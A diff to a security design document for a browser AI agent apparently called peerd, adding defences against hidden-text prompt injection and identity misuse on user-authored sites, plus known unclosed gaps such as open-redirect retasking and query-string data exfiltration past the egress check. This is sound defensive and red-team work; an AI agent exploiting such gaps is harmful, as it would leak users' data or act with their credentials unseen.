@@ -313,6 +313,32 @@ in the same context that holds the authority.
 Code: the gate stack and heap split cited above. Red-team: scenario 08, which includes
 the side-by-side comparison.
 
+### INV-10. What the model reads is what a human could have seen
+Page bytes that are invisible to a person but legible to a model — zero-width and
+soft-hyphen runs, bidi overrides, the Unicode Tags block, variation-selector
+sequences, HTML comments — are removed before the text reaches the model. The strip
+runs at both read boundaries and inside the untrusted-data fence itself, so a new
+web-sourced tool cannot forget it, and it runs TWICE around HTML extraction, because
+extraction parses the document and turns `&#8203;` — seven ordinary ASCII characters
+on the way in — into a real zero-width byte on the way out. Legitimate content is not
+collateral: every non-Latin script survives, including the ZWNJ that Persian, Urdu and
+the Indic scripts require orthographically, and the comment-removal pass is applied
+only where a comment is genuinely a comment (markup), never to JSON or plain text
+where `<!--` is visible content.
+Code: `peerd-runtime/dom/cdr.js`, wired at `tools/prompt-wrap.js`,
+`tools/defs/fetch-url.js`, `tools/defs/read-page.js`. Red-team: scenario 09.
+
+### INV-11. Borrowing the user's identity on a page strangers wrote takes the user
+An authenticated write on an origin where third parties author the content (issue
+trackers, shared docs, social feeds) requires the user to confirm, **even when
+confirmations are disabled** — which is the product default, and therefore the only
+posture in which the rule means anything. Reads are exempt (reading is the point of
+sending an actor there) and so is navigation (leaving is how it finishes). The zone is
+classified from the tab's live URL rather than a turn-start pin, because an in-page
+hop moves the page with no tool call to observe.
+Code: `peerd-runtime/actor/ugc-registry.js`, enforced in `tools/dispatcher.js`.
+Red-team: scenario 09.
+
 ### Additional invariants (not scenario-gated, enforced in code)
 
 - INV-9. Vault fails closed. A secret read or write is refused with `VaultLockedError`
@@ -433,6 +459,45 @@ evaluating peerd should know. Each cites where it lives in the code.
   public host is not prevented by the allowlist. It is mitigated only by the
   keyless-web-actor architecture (INV-3). (`peerd-egress/vault/keys.js`, and the header of
   `peerd-egress/fetch/safe-fetch.js`.)
+- R12. A web actor's owned origin is mutable, so an open redirect can retask it. A tab
+  actor is pinned to a TAB, not an origin, and `tools/defs/navigate.js` re-stamps that
+  pin to wherever the tab lands after redirects — deliberately, so the next tool sees
+  the live origin. The consequence is that an open redirect on any site the actor may
+  visit moves it to an attacker origin with the pin updated to match, and a page-driven
+  redirect (meta refresh, JS) does it with no tool call to inspect at all. The remaining
+  wall is the denylist, which is a blocklist, so an unknown origin passes. INV-10 and
+  INV-11 do not cover this: the egress tripwire inspects `navigate` ARGUMENTS, and a
+  redirect changes the LANDING. Already named next door for the credential-injection
+  design (`peerd-egress/fetch/origin-credentials.js`, "the owned-origin
+  SSRF/open-redirect residual is accepted + named in the spec"); it becomes load-bearing
+  once anything is built on origin identity. Being closed in issue #251, which segments
+  web actors into roaming (no authority, cannot enter a credentialed site) and bound
+  (owns one origin, cannot leave it) and judges the LANDING rather than the request.
+  (`peerd-runtime/actor/web-actor.js` line ~136 states the mutability outright.)
+- R13. The egress tripwire does not scan the query string or fragment, so the canonical
+  exfil GET is uncovered. `attacker.test/?d=<blob>` is not inspected, because that is
+  where legitimate long high-entropy values live — OIDC `id_token`s, SAML requests,
+  presigned-URL signatures — and scanning them would false-block federated login, which
+  is a worse failure for a browser agent than the leak it prevents. Navigation is also
+  exempt from INV-11 by design. The INTERSECTION of those two individually-reasonable
+  exemptions is an off-origin navigation carrying a payload in the query, which is the
+  arc's stated target and is not closed. Not a regression — identical before the arc.
+  (`peerd-runtime/tools/egress-heuristics.js`, KNOWN RESIDUALS.)
+- R14. INV-9's structural reply boundary ships OFF. The deterministic actor-reply
+  envelope is default-off on both channels behind a Settings toggle, so for a default
+  install the web actor's reply crosses on the prompt fence alone — a strong hint to the
+  model, not a wall. The invariant is written as "when armed" and the red-team probe
+  drives the validator directly for that reason. Turning it on by default waits on field
+  evidence that the format holds. (`packaging/default-settings.mjs`
+  `schemaValidatedReplies`.)
+- R15. Sensitive-origin classification is a list, and lists are incomplete. The origin
+  work in #251 decides "is this a site the user has an identity on" from a curated
+  registry, origins with a stored credential, and two learned signals (a password field
+  observed, a write confirmed). It fails open, so an unlisted credentialed site — a
+  bank, webmail, an internal tool — is treated as ordinary until a signal fires, and the
+  FIRST visit to any such site is therefore unprotected by construction. Detecting
+  credentials directly would need the `cookies` permission, which is not requested for
+  the same reason `webNavigation` is not.
 
 Candidates for future red-team scenarios, from the partially-defended surfaces above:
 R2 memory poisoning and R3 skill-body smuggling. (R4 chain tampering, R5 grant
@@ -444,12 +509,21 @@ and the R6 block in tests/peerd-runtime/transfer/transfer.test.ts.)
 
 ## 9. Testability: the red-team suite
 
-Every invariant INV-1 through INV-8 is checked by an executable probe in
+Every invariant INV-1 through INV-11 is checked by an executable probe in
 [`tests/red-team/`](../../tests/red-team/). Each scenario drives the real defense
 function with hostile input and records whether the defense held. It runs under
 `bun test ./tests/red-team`, which is a CI gate, and publishes a result matrix to
 [`RED-TEAM-RESULTS.md`](./RED-TEAM-RESULTS.md) via `bun run red-team:report`. The
 real-realm escapes (scenario 06) are verified in the in-browser CDP suite.
+
+Scenario 09 is worth reading differently from the rest. Its corpus is not invented:
+every case is either a documented channel or a bug an adversarial review of the
+#241-#244 arc actually produced and we then fixed, so it is a regression net under
+specific defects rather than a demonstration. It also carries two cases that assert a
+defense does NOT fire — Persian text keeps the ZWNJ it needs, and a federated-login URL
+full of high-entropy tokens is allowed through. A security check that breaks ordinary
+use gets switched off, and then it defends nothing, so the false-positive guards are
+part of the claim rather than an afterthought.
 
 Read this as evidence, not proof. These are runnable probes for the core
 invariants above, not a complete adversarial audit. Most run at the unit level
